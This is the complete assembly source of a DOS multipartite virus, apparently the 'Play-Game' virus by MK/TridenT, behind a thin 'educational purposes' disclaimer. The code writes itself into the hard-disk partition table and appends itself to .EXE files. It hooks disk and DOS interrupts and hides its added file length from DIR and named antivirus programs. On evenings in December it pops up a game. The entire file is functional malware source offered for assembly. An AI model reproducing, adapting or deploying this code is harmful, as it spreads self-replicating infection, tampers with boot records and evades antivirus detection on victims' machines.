;------------------------------------------------------------------------------
;   Play-Game VIRUS     version 1
; 
;   Use TASM 2.01 to compile this source
;   (other assemblers will probably not produce the same result)
; 
;   Disclaimer:
;   This file is only for educational purposes. The author takes no
;   responsibility for anything anyone does with this file. Do not
;   modify this file!
;------------------------------------------------------------------------------
 

                .model  tiny
                .RADIX  16
                .code


VERSION         equ     1
FILELEN         equ     offset last - first     ;Length of virus.
VIRSEC          equ     (FILELEN+1FF)/200       ;Number of sectors for virus
VIRKB           equ     (FILELEN+3FF+100)/400   ;Length in kB.
SECLEN          equ     200                     ;length of a sector.
STACKLEN        equ     200                     ;Wanted length of stack in
                                                ;infected file.
STACKOFF        equ     ((FILELEN+SECLEN+STACKLEN+11)/2)*2   ;Stack offset in
                                                             ;infected file.
DATAPAR         equ     (SECLEN+STACKLEN+20)/10 ;Minimal extra memory to
                                                ;allocate for infected file
                                                ;(area to load part. table
                                                ;and room for stack).
BUFLEN          equ     1C                      ;Length of buffer.
BOOTLEN         equ     boot_end - boot_begin   ;Length of boot-routine.


;------------------------------------------------------------------------------
;               Data area for virus.
;------------------------------------------------------------------------------

                org     00F0

hook            db      ?                       ;Flag for hooking int21
minibuf         db      (4) dup (?)             ;Mini buffer for internal use.


;------------------------------------------------------------------------------
;               Data area for game.
;------------------------------------------------------------------------------

bombs           db      ?                       ;Number of bombs.
pos             db      ?                       ;Position.
oldpos          db      ?                       ;Previous position.
level           db      ?
kleur           db      ?
timer           db      ?
tijd            dw      ?


;------------------------------------------------------------------------------
;               Begin of virus, installation in partition table of harddisk
;------------------------------------------------------------------------------

                org     0100

first:          db      '[ MK / TridenT ]'      ;Author + Group.

                call    next
next:           pop     si                      ;Get IP.
                sub     si,13                   ;Calculate relative offset.
                mov     di,0100
                cld

                call    push_all                ;Save some registers.

                push    cs                      ;Make DS and ES equal to CS.
                push    cs
                pop     ds
                pop     es

                mov     ah,30                   ;Check if DOS version >= 4.0
                int     21
                cmp     al,4
                jb      not_install

                cmp     ax,0DEADh               ;Check if another TridenT
                je      not_install             ;(multi-partite) virus is
                                                ;resident. 

                mov     ax,0FE02                ;Check if Tequila virus
                int     21                      ;is resident. 
                cmp     ax,01FDh
                je      not_install

                mov     ax,33E4                 ;Check if virus is already
                int     21                      ;resident.
                cmp     ah,0A5
                je      not_install

                call    infect_part

not_install:    mov     ah,2A                   ;Ask date.
                int     21
                cmp     dh,12d                  ;december?
                jb      dont_play
                mov     ah,2C                   ;Ask time.
                int     21
                cmp     ch,21d                  ;time > 21:00 ?
                jb      dont_play

                mov     ax,33E5                 ;Play the game!
                int     21  

dont_play:      call    pop_all                 ;Restore registers.

                add     si,offset buffer-100
                cmp     byte ptr cs:[si],'M'    ;Check if generation 0.
                je      entryE

                int     20                      ;It was a COM file (gen. 0).

entryE:         mov     bx,ds                   ;Calculate CS.
                add     bx,low 10
                mov     cx,bx
                add     bx,cs:[si+0E]
                cli                             ;Restore SS and SP.
                mov     ss,bx
                mov     sp,cs:[si+10]
                sti
                add     cx,cs:[si+16]
                push    cx                      ;Push new CS on stack.
                push    cs:[si+14]              ;Push new IP on stack.
                retf


;------------------------------------------------------------------------------
;               Infect partition table sector
;------------------------------------------------------------------------------

infect_part:    lea     bx,[si+last-100]        ;Read partition table
                mov     ax,0201                 ;at end of virus.
                mov     cx,1
                mov     dx,80
                int     13
                jc      not_infect_par

                cmp     word ptr [bx],'KM'      ;Check if already infected.
                je      not_infect_par

                cmp     word ptr [bx],05EA      ;Check if infected with
                je      not_infect_par          ;Stoned or Michelangelo.

                lea     di,[bx+01BE]            ;Check partition info.
                mov     bl,4
check_part:     cmp     byte ptr [di+4],0       ;Skip if not a valid partition.
                je      next_part
                cmp     word ptr [di+0A],0      ;Enough room for virus?
                jne     next_part
                cmp     word ptr [di+8],VIRSEC+2
                jb      not_infect_par          ;Quit if not enough room.
next_part:      add     di,10
                dec     bl
                jnz     check_part

                lea     bx,[si+last-100]        ;Save original partition table
                mov     ax,0301                 ;to sector 2.
                mov     cx,2
                int     13
                jc      not_infect_par

                lea     bx,[si+first-100]       ;Write the virus to sector 3.
                mov     ax,0300+VIRSEC
                mov     cx,3
                int     13
                jc      not_infect_par

                lea     di,[si+last-100]        ;Infect part table.
                lea     si,[si+boot_begin-100]
                mov     bx,di
                mov     cx,BOOTLEN
        rep     movsb

                mov     ax,0301                 ;Write infected partition table
                mov     cx,1                    ;to sector 1.
                int     13

not_infect_par: ret


;------------------------------------------------------------------------------
;               Partition table routine
;------------------------------------------------------------------------------

boot_begin:     db      'MK'                    ;Signature (= DEC BP, DEC BX).

                cld                             ;Initialise segments + stack.
                cli
                xor     ax,ax
                mov     ds,ax
                mov     ss,ax
                mov     sp,7C00
                sti

                mov     di,0400                 ;Adjust memory size.
                mov     ax,ds:[di+13]
                sub     ax,VIRKB
                mov     ds:[di+13],ax

                mov     cl,6                    ;Calculate segment for
                shl     ax,cl                   ;resident virus.
                mov     es,ax

                mov     cx,BOOTLEN              ;Copy virus to top.
                mov     si,sp                   ;SP=7C00
                xor     di,di
        rep     movsb

                mov     bx,offset here-offset boot_begin     ;Jump to top.
                push    es
                push    bx
                retf

here:           mov     ax,0200+VIRSEC          ;Load complete virus.
                mov     cx,3
                mov     dx,0080
                mov     bx,0100
                int     13
                jc      load_part  

                cli
                mov     ax,offset ni13          ;Set new vector 13.
                xchg    ds:[4*13],ax
                mov     cs:[oi13],ax            ;Save old vector 13.
                mov     ax,es
                xchg    ds:[4*13+2],ax
                mov     cs:[oi13+2],ax

                les     bx,ds:[4*21]            ;Get original vector 21.
                mov     cs:[oi21],bx
                mov     cs:[oi21+2],es
                sti

                mov     byte ptr cs:[hook],1    ;Turn on hook-flag.

load_part:      mov     di,5
                push    ds
                pop     es
part_loop:      mov     ax,0201                 ;Load original part. sector.
                mov     cx,2
                mov     dx,0080
                mov     bx,sp
                int     13
                jnc     jump_part

                xor     ax,ax                   ;Reset Drive
                int     13
                dec     di
                jnz     part_loop               ;Try again.
                int     18                      ;Error: activate ROM BASIC.

jump_part:      push    ds                      ;Push next address.
                push    bx
                retf
boot_end:


;------------------------------------------------------------------------------
;               Int 13 handler
;------------------------------------------------------------------------------

ni13:           cmp     byte ptr cs:[hook],0    ;Is int 21 already hooked?
                je      do_int13

                push    ds
                push    es
                push    bx
                push    ax
                cli

                xor     ax,ax
                mov     ds,ax

                les     bx,ds:[4*21]            ;Compare int 21 vector
                mov     ax,es                   ;with saved old vector.

                cmp     ax,800
                ja      dont_hook
                cmp     bx,cs:[oi21]
                jne     hook_21
                cmp     ax,cs:[oi21+2]
                je      dont_hook

hook_21:        mov     cs:[oi21],bx            ;Save old vector 21.
                mov     cs:[oi21+2],ax

                mov     ds:[4*21],offset ni21   ;Set new vector 21.
                mov     ds:[4*21+2],cs

                mov     byte ptr cs:[hook],0    ;Don't hook int 21 anymore.

dont_hook:      sti
                pop     ax
                pop     bx
                pop     es
                pop     ds


do_int13:       cmp     cx,1                    ;Check if part. table
                jne     orgint13                ;is read or written.
                cmp     dx,80
                jne     orgint13
                cmp     ah,2
                jb      orgint13
                cmp     ah,3
                ja      orgint13
                or      al,al
                jz      orgint13

                push    cx
                dec     al
                jz      nothing_left
                push    ax                      ;Do original function
                push    bx
                add     bx,0200
                inc     cx
                pushf
                call    dword ptr cs:[oi13]
                pop     bx
                pop     ax

nothing_left:   mov     al,1                    ;Read/write redirected
                mov     cx,2                    ;partition table.
                pushf
                call    dword ptr cs:[oi13]
                pop     cx
                retf    2


orgint13:       db      0EA
oi13            dw      0, 0                    ;Original int 13 vector.


;------------------------------------------------------------------------------
;               Interupt 21 handler
;------------------------------------------------------------------------------

ni21:           pushf

                cmp     ax,33E4                 ;Installation-check ?
                jne     not_ic
                mov     ax,0A500+VERSION        ;Yes? Return a signature.
                popf
                iret

not_ic:         cmp     ax,33E5                 ;Play game ?
                jne     not_pg
                call    play_game
                popf
                iret

not_pg:         call    push_all                ;Check if interupt came from
                call    getname                 ;a program that may not see
                mov     dx,offset namesHI       ;true length of infected file
                mov     cx,2+11d                ;(AV program or 'DIR').
                call    checknames
                call    pop_all
                jne     no_hide

                cmp     ah,11                   ;Findfirst/findnext FCB?
                je      its_11_12
                cmp     ah,12
                jne     not_11_12
its_11_12:      popf
                call    findFCB
                retf    2

not_11_12:      cmp     ah,4E                   ;Findfirst/findnext handle?
                je      its_4E_4F
                cmp     ah,4F
                jne     no_hide
its_4E_4F:      popf
                call    findhndl
                retf    2


no_hide:        call    push_all                ;Save registers.

                cmp     ax,6C00                 ;Open from DOS 4.0+ ?
                jne     not_6C00
                call    f_open2
                jmp     short exit

not_6C00:       cmp     ah,3Dh                  ;File open?
                jne     not_3D
                call    f_open
                jmp     short exit

not_3D:         cmp     ah,3E                   ;File close?
                jne     not_3E
                call    f_close
                jmp     short exit

not_3E:         cmp     ax,4B00                 ;Program execute?
                jne     exit
                call    f_execute    

exit:           call    pop_all                 ;Restore registers.

                popf

                db      0EA                     ;Original int 21.
oi21            dw      0, 0


;------------------------------------------------------------------------------
;               Interupt 24 handler
;------------------------------------------------------------------------------

ni24:           mov     al,3                    ;To avoid 'Abort, Retry, ...'
                iret


;------------------------------------------------------------------------------
;               Call original int21
;------------------------------------------------------------------------------

DOS:            pushf
                call    dword ptr cs:[oi21]
                ret


;------------------------------------------------------------------------------
;               Hide the virus from filelength
;------------------------------------------------------------------------------

findFCB:        call    DOS                     ;Call original function.
                or      al,al
                jne     ret1  
                pushf
                push    bx
                push    ax
                push    es
                mov     ah,2F                   ;Ask DTA adres.
                call    DOS
                cmp     byte ptr es:[bx],0FF    ;Extended FCB?
                jne     vv1
                add     bx,7
vv1:            mov     al,byte ptr es:[bx+17]  ;Check if infected
                and     al,1Fh                  ;(seconds=62).
                cmp     al,1Fh
                jne     dont_hide
                sub     word ptr es:[bx+1Dh],FILELEN    ;Hide virus length.
                sbb     word ptr es:[bx+1F],0
                dec     bx
                jmp     short hide_time


findhndl:       call    DOS                     ;Call original function.
                jc      ret1
                pushf
                push    bx
                push    ax
                push    es
                mov     ah,2F                   ;ask DTA adres
                call    DOS
                mov     al,byte ptr es:[bx+16]  ;Check if infected.
                and     al,1Fh
                cmp     al,1Fh
                jne     dont_hide
                sub     word ptr es:[bx+1A],FILELEN     ;Hide virus length.
                sbb     word ptr es:[bx+1C],0
hide_time:      and     byte ptr es:[bx+16],0EFh        ;Also hide seconds.
dont_hide:      pop     es
                pop     ax
                pop     bx
                popf
ret1:           ret


;------------------------------------------------------------------------------
;               Try to infect or disinfect the file
;------------------------------------------------------------------------------

f_close:        cmp     bx,5                    ;Is handle >= 5?
                jb      ret1                    ;Quit if not.
                mov     ah,45                   ;Duplicate handle
                jmp     short doit

f_execute:      mov     ah,3Dh                  ;Open file
doit:           call    DOS
                jc      ret1
                xchg    ax,bx
                mov     bp,1                    ;Flag for infect.
                jmp     short get_ctrlbrk


f_open2:        mov     dx,si                   ;Use 'normal' open function
                mov     ah,3Dh                  ;instead of 6C00 function.
f_open:         call    DOS
                jc      ret1
                xchg    ax,bx
                xor     bp,bp                   ;Flag for disinfect.


get_ctrlbrk:    cld

                mov     ax,3300                 ;Get ctrl-break flag.
                call    DOS
                push    dx

                cwd                             ;Disable Ctrl-break.
                inc     ax
                push    ax
                call    DOS

                mov     dx,bx
                mov     ax,3524                 ;Get int24 vector.
                call    DOS
                push    bx
                push    es
                mov     bx,dx

                push    cs
                pop     ds

                mov     dx,offset ni24          ;Install new int24 handler.
                mov     ah,25
                push    ax
                call    DOS

                mov     ax,1220                 ;Get pointer to file table
                push    bx
                int     2F
                mov     bl,es:[di]
                mov     al,16                   ;(Avoid [512] signature...)
                mov     ah,12
                int     2F
                pop     bx                      ;ES:DI -> file table

                push    es
                pop     ds

                push    [di+2]                  ;Save attribute & open-mode.
                push    [di+4]

                cmp     word ptr [di+28],'XE'   ;Check if extension is .EXE
                jne     close1
                cmp     byte ptr [di+2A],'E'
                jne     close1

;                cmp     word ptr [di+20],'XX'   ;Check if name is 'XX*.EXE'
;                jne     close1                  ;(only for test purposes).

                test    bp,bp                   ;Infect or disinfect?
                jz      check_disinf

                mov     ax,word ptr [di+20]     ;Check if file may be infected.
                mov     dx,offset namesSC
                mov     cx,11d+4
                call    checknames
                je      close1
                jmp     short go_on

check_disinf:   call    getname                 ;Check if file must be
                mov     dx,offset namesSC       ;disinfected (only if an
                mov     cx,11d                  ;AV program is active).
                call    checknames
                jne     close1

go_on:          mov     byte ptr [di+2],2       ;Open file for both read/write.
                mov     byte ptr [di+4],0       ;Clear attributes
                call    gotobegin
                push    ax                      ;Save old file offset
                push    dx

                push    cs
                pop     ds

                mov     cx,BUFLEN               ;Read begin of file
                mov     si,offset buffer        ;into buffer.
                mov     dx,si
                call    read

                call    checkfile               ;Check if file is OK to infect
                jc      close2                  ;or disinfect.

                mov     ax,word ptr [si+12]     ;Already infected?
                add     al,ah
                cmp     al,'#'
                je      is_infected

                test    bp,bp                   ;Must it be infected?
                jz      close2

                call    do_infect

is_infected:    test    bp,bp                   ;Must it be disinfected?
                jnz     close2

                call    do_disinfect

close2:         push    es
                pop     ds

                pop     dx                      ;Restore file offset.
                pop     ax
                call    goto
                or      byte ptr [di+6],40      ;Don't change file-time.

close1:         mov     ah,3E                   ;Close the file.
                call    DOS

                or      byte ptr [di+5],40      ;No EOF on next close.
                pop     [di+4]                  ;Restore attribute & open-mode.
                pop     [di+2]

                pop     ax                      ;Restore int 24 vector.
                pop     ds
                pop     dx
                call    DOS

                pop     ax                      ;Restore ctrl-break flag.
                pop     dx
                call    DOS

                ret


;------------------------------------------------------------------------------
;               Special filenames
;------------------------------------------------------------------------------

namesHI         db      'CO', '4D'                      ;COMMAND.COM and 4DOS.
namesSC         db      'SC', 'CL', 'VS', 'NE'          ;AV programs.
                db      'HT', 'TB', 'VI', 'F-'
                db      'FI', 'GI', 'IM' 
namesCH         db      'RA', 'FE', 'MT', 'BR'          ;Some self-checking
                                                        ;programs.

;------------------------------------------------------------------------------
;               Check the file
;------------------------------------------------------------------------------

checkfile:      cmp     word ptr [si],'ZM'      ;Is it a normal EXE ?
                jne     not_good

                cmp     word ptr [si+18],40     ;Check if it is a windows/OS2
                jb      not_win                 ;EXE file.

                mov     ax,003C                 ;Read pointer to NE header.
                cwd
                call    readbytes
                jc      not_good

                mov     ax,word ptr [si+BUFLEN]       ;Read NE header.
                mov     dx,word ptr [si+BUFLEN+2]
                call    readbytes
                jc      not_good
                
                cmp     byte ptr [si+BUFLEN+1],'E'    ;Quit if it is a NE
                je      not_good                      ;header.

not_win:        call    getlen
                call    calclen                 ;Check for internal overlays.
                cmp     word ptr [si+4],ax
                jne     not_good
                cmp     word ptr [si+2],dx
                jne     not_good

                cmp     word ptr [si+0C],0      ;High memory allocation?
                je      not_good

                cmp     word ptr [si+1A],0      ;Overlay nr. not zero?
                jne     not_good

                clc                             ;File is OK.
                ret

not_good:       stc                             ;File is not OK.
                ret


;------------------------------------------------------------------------------
;               Write virus to the program
;------------------------------------------------------------------------------

do_infect:      call    getlen                  ;Go to end of file.
                call    goto

                mov     dx,0100                 ;Write virus.
                mov     cx,FILELEN
                call    write
                cmp     ax,cx                   ;Are all bytes written?
                jne     not_infect

                call    getoldlen               ;Calculate new CS & IP.
                mov     cx,0010
                div     cx
                sub     ax,word ptr [si+8]
                add     dx,low 10

                mov     word ptr [si+16],ax     ;Put CS in header.
                mov     word ptr [si+0E],ax     ;Put SS in header.
                mov     word ptr [si+14],dx     ;Put IP in header.
                mov     word ptr [si+10],STACKOFF    ;Put SP in header.

                call    getlen                  ;Put new length in header.
                call    calclen
                mov     word ptr [si+4],ax
                mov     word ptr [si+2],dx

                push    di
                lea     di,[si+0A]              ;Adjust mem. allocation info.
                call    mem_adjust
                lea     di,[si+0C]
                call    mem_adjust
                pop     di

                call    gotobegin               ;Write new begin of file.
                in      al,40
                mov     ah,'#'
                sub     ah,al
                mov     word ptr [si+12],ax
                mov     cx,BUFLEN
                mov     dx,si
                call    write

                or      byte ptr es:[di+0Dh],1F    ;set filetime to 62 sec.

not_infect:     ret


;------------------------------------------------------------------------------
;               Disinfect the program
;------------------------------------------------------------------------------

do_disinfect:   call    getoldlen               ;Go to original end of file
                add     ax,(offset buffer-100)
                adc     dx,0
                call    goto                    ;Go to buffer in virus.

                mov     dx,si                   ;Read buffer.
                mov     cx,BUFLEN
                call    read

                cmp     word ptr [si],'ZM'      ;Is there an EXE header
                jne     not_disinfect           ;in the buffer?

                call    gotobegin               ;Write the buffer to
                mov     dx,si                   ;begin of file.
                mov     cx,BUFLEN
                call    write

                call    getoldlen               ;Restore original length
                mov     es:[di+11],ax           ;of file.
                mov     es:[di+13],dx

                and     byte ptr es:[di+0Dh],0E0        ;Seconds = 0.

not_disinfect:  ret


;------------------------------------------------------------------------------
;               Get name of current process
;------------------------------------------------------------------------------

getname:        push    ds
                push    bx

                mov     ah,62                   ;Get PSP address.
                call    DOS
                dec     bx
                mov     ds,bx
                mov     ax,ds:[0008]            ;Get first 2 characters
                                                ;of current process name.
                pop     bx
                pop     ds
                ret


;------------------------------------------------------------------------------
;               Check names
;------------------------------------------------------------------------------

checknames:     push    di
                push    es

                push    cs                      ;Search name in list CS:DX
                pop     es
                mov     di,dx
        repnz   scasw 

                pop     es
                pop     di
                ret


;------------------------------------------------------------------------------
;               Calculate length for EXE header
;------------------------------------------------------------------------------

calclen:        mov     cx,0200                 ;Divide by 200h
                div     cx
                or      dx,dx                   ;Correction?
                jz      no_cor
                inc     ax
no_cor:         ret


;------------------------------------------------------------------------------
;               Adjust mem allocation info in EXE header
;------------------------------------------------------------------------------

mem_adjust:     cmp     word ptr [di],DATAPAR   ;Enough memory allocated?
                jnb     mem_ok
                mov     word ptr [di],DATAPAR   ;Minimum amount to allocate.
mem_ok:         ret


;------------------------------------------------------------------------------
;               Read a few bytes
;------------------------------------------------------------------------------

readbytes:      call    goto                    ;Go to DX:AX and read 4 bytes
                mov     dx,offset minibuf       ;from that location into
                mov     cx,4                    ;mini-buffer.
read:           mov     ah,3F
                call    DOS
                ret

write:          mov     ah,40                   ;Write function.
                call    DOS
                ret


;------------------------------------------------------------------------------
;               Get original length of program
;------------------------------------------------------------------------------

getoldlen:      call    getlen
                sub     ax,FILELEN
                sbb     dx,0
                ret


;------------------------------------------------------------------------------
;               Get length of program
;------------------------------------------------------------------------------

getlen:         mov     ax,es:[di+11]
                mov     dx,es:[di+13]
                ret


;------------------------------------------------------------------------------
;               Goto new offset DX:AX
;------------------------------------------------------------------------------

gotobegin:      xor     ax,ax
                cwd
goto:           xchg    ax,es:[di+15]
                xchg    dx,es:[di+17]
                ret


;------------------------------------------------------------------------------
;               Push all registers on stack
;------------------------------------------------------------------------------

push_all:       push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    bp
                push    ds
                push    es
                mov     bp,sp
                jmp     [bp+12]


;------------------------------------------------------------------------------
;               Pop all registers from stack
;------------------------------------------------------------------------------

pop_all:        pop     ax
                mov     bp,sp
                mov     [bp+12],ax
                pop     es
                pop     ds
                pop     bp
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                ret


;------------------------------------------------------------------------------
;               Game
;------------------------------------------------------------------------------

play_game:      call    rnd_init                ;Initialize random number
                                                ;generator.
                mov     ah,0F                   ;Get video mode.
                int     10

                xor     ah,ah                   ;Clear screen and set to
                push    ax                      ;40 column mode.
                mov     al,1
                int     10

                mov     ah,3                    ;Clear cursor.
                int     10
                push    cx
                mov     ah,1
                xor     cx,cx
                int     10

start_game:     push    cs
                push    cs
                pop     ds
                pop     es

                xor     al,al                   ;Clear screen
                call    scroll_screen

                mov     si,offset orgvalues     ;Initialize parameters.
                mov     di,offset bombs
                movsw
                xor     ax,ax
                stosw
                stosw
                stosw

                mov     dx,0B800                ;ES points to screen memory.
                mov     es,dx

                mov     si,offset beginmess     ;Print first message.
                mov     di,40d*2*5+20d
                mov     cx,12d
                call    print_it2

                mov     di,40d*2*9+4
                mov     cl,20d
                call    print_it2

                mov     di,40d*2*20d+24d
                mov     cl,16d
                call    print_it

                call    wachttoets              ;Wait for keypress or timeout.

                xor     al,al                   ;Clear screen.
                call    scroll_screen

main_lup:       mov     al,byte ptr [oldpos]    ;Clear old position.
                call    gotopos
                mov     ax,0700
                stosw

                mov     al,byte ptr [pos]
                mov     byte ptr [oldpos],al

                mov     al,1                    ;Scroll screen up.
                call    scroll_screen

                mov     al,byte ptr [pos]       ;Goto current position.
                call    gotopos
                mov     al,es:[di]              ;Hit a block?
                cmp     al,0FE
                mov     ax,0E02                 ;Print smily face.
                stosw
                je      stop_game

                call    print_bombs             ;Print a number of bombs.

                call    wacht

                in      al,61                   ;Make 'click' sound.
                push    ax
                or      al,3
                out     61,al

                call    check_key               ;Check for shift keys.

                pop     ax                      ;Turn 'click' off
                out     61,al

                inc     byte ptr [timer]        ;Check timer.
                mov     al,byte ptr [timer]
                and     al,7F
                jnz     not_zero
                inc     byte ptr [kleur]        ;Change color and number of
                inc     byte ptr [bombs]        ;bombs every 128th row.

not_zero:       cmp     al,12d
                jne     main_lup

                inc     byte ptr [level]        ;Increase level as soon as
                cmp     byte ptr [level],9      ;new color has reached.
                jb      main_lup                ;position. Maximum is 9.


stop_game:      mov     ax,0E07                 ;Beep!
                int     10

                mov     si,offset endmess       ;Print message 'You reached..'.
                mov     di,40d*2*24d
                mov     cx,18d
                call    print_it

                mov     al,byte ptr [level]     ;Print reached level.
                add     al,30
                stosw

                add     di,20d                  ;Print message 'Play again?'.
                mov     cl,11d
                call    print_it


                call    wachttoets              ;Wait for key or timeout.
                jz      stop_echt
                or      al,20
                cmp     al,'y'                  ;Play again if 'Y' was
                jne     stop_echt               ;pressed.
                jmp     start_game

stop_echt:      pop     cx
                mov     ah,1
                int     10

                pop     ax                      ;clear screen
                int     10

                ret


;------------------------------------------------------------------------------
;               Print CX characters from DS:SI to ES:DI
;------------------------------------------------------------------------------

print_it:       lodsb
                mov     ah,7
                stosw
                loop    print_it
                ret


;------------------------------------------------------------------------------
;               Print CX characters from DS:SI to ES:DI (wide)
;------------------------------------------------------------------------------

print_it2:      lodsb
                mov     ah,7
                stosw
                mov     al,20
                stosw
                loop    print_it2
                ret


;------------------------------------------------------------------------------
;               Go to position on screen.
;------------------------------------------------------------------------------

gotopos:        cbw
                shl     ax,1
                mov     di,40d*2*12d
                add     di,ax
                ret


;------------------------------------------------------------------------------
;               Scroll the screen up AL rows
;------------------------------------------------------------------------------

scroll_screen:  push    bx
                mov     ah,06
                mov     bh,7
                mov     cx,0
                mov     dx,(25d-1)*100+(40d-1)
                int     10
                pop     bx
                ret


;------------------------------------------------------------------------------
;               Print some bombs at bottom row.
;------------------------------------------------------------------------------

print_bombs:    mov     cl,byte ptr [bombs]     ;Number of bombs.
                xor     ch,ch
bomb_lup:       call    rnd_get                 ;Calculate position.
                cmp     al,(40d-1)
                ja      bomb_lup
                cbw
                shl     ax,1
                mov     di,40d*2*(25d-1)
                add     di,ax
                mov     al,byte ptr [kleur]     ;Calculate color.
                mov     bx,offset colors
                xlat
                xchg    ah,al
                mov     al,0FE                  ;Print bomb.
                stosw
                loop    bomb_lup
                ret


;------------------------------------------------------------------------------
;               Wait a short time.
;------------------------------------------------------------------------------

wacht:          mov     dx,word ptr [tijd]
                add     dx,2
                xor     ax,ax
                mov     ds,ax
time_lup:       mov     ax,ds:[046C]            ;Get current time.
                cmp     ax,dx
                jb      time_lup
                
                push    cs
                pop     ds
                mov     word ptr [tijd],ax
                ret


;------------------------------------------------------------------------------
;               Wait for timeout or keypress.
;------------------------------------------------------------------------------

wachttoets:     mov     ah,1                    ;Empty keyboard buffer.
                int     16
                jz      now_empty
                xor     ah,ah
                int     16
                jmp     short wachttoets

now_empty:      xor     ax,ax
                mov     ds,ax
                mov     dx,ds:[046C]
                add     dx,18d*8
wt_lup:         mov     ah,1                    ;Check key.
                int     16
                jnz     stop_waiting
                mov     ax,ds:[046C]            ;Check time.
                cmp     ax,dx
                jb      wt_lup
                
stop_waiting:   push    cs
                pop     ds
                ret


;------------------------------------------------------------------------------
;               Check if shift key's are pressed.
;------------------------------------------------------------------------------

check_key:      mov     ah,2
                int     16

                test    al,1
                jz      not_right
                cmp     byte ptr [pos],(40d-1)
                je      not_right
                inc     byte ptr [pos]
                ret

not_right:      test    al,2
                jz      no_key
                cmp     byte ptr [pos],0
                je      no_key
                dec     byte ptr [pos]
no_key:         ret


;------------------------------------------------------------------------------
;               Random number generator.
;------------------------------------------------------------------------------

rnd_init:       push    ax
                push    cx
                call    rnd_init0               ;init
                and     ax,000F
                inc     ax
                xchg    ax,cx
random_lup:     call    rnd_get                 ;call random routine a few
                loop    random_lup              ;  times to 'warm up'
                pop     cx
                pop     ax
                ret

rnd_init0:      push    dx                      ;initialize generator
                push    cx
                push    ds
                xor     ax,ax
                mov     ds,ax
                in      al,40
                mov     ah,al
                in      al,40
                xor     ax,word ptr ds:[041E]
                mov     dx,word ptr ds:[046C]
                xor     dx,ax
                pop     ds
                jmp     short move_rnd

nonzero_get:    call    rnd_get
                or      ax,ax
                jz      nonzero_get
                ret

rnd_get:        push    dx                      ;calculate a random number
                push    cx
                push    bx
                in      al,40
values:         add     ax,0                    ;will be: mov ax,xxxx
                mov     dx,0                    ;  and mov dx,xxxx
                mov     cx,7
rnd_lup:        shl     ax,1
                rcl     dx,1
                mov     bl,al
                xor     bl,dh
                jns     rnd_l2
                inc     al
rnd_l2:         loop    rnd_lup
                pop     bx

move_rnd:       push    si
                call    me
me:             pop     si
                mov     word ptr cs:[si+(offset values-offset me)+1],ax
                mov     word ptr cs:[si+(offset values-offset me)+4],dx
                pop     si
                mov     al,dl
                pop     cx
                pop     dx
                ret


;------------------------------------------------------------------------------
;               Data
;------------------------------------------------------------------------------

beginmess       db      'HAPPY VIRUS '
                db      'Time to play a game '
                db      '(Use shift keys)'


endmess         db      'You reached level '
                db      'Play again?'

colors          db      4, 5, 1, 3, 0C, 0Dh, 9, 0Bh, 0


orgvalues       db      3, (40d/2)

buffer          db      (BUFLEN) dup ('#')      ;Buffer for orig. EXE header.


last:
                end    first

